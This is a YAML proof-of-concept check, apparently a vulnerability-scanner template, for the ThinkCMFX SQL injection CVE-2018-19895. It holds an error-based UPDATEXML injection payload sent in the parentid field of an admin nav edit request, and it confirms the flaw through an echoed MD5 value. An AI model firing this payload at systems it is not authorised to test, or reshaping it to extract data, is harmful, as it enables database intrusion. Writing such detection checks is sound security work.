name: poc-yaml-thinkcmf-cve-2018-19895-sqli
binding: fd184ecb-8cf9-4df4-a72a-df42b4065b68
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19895
        - https://github.com/thinkcmf/cmfx/issues/26
    vulnerability:
        id: CT-37480
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info: 后台管理员权限
transport: http
set:
    rand1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?g=Admin&m=nav&a=edit_post
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: parentid=1 and UPDATEXML(1,CONCAT(0x7e,(SELECT md5({{rand1}})),0x7e),1)
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r0()
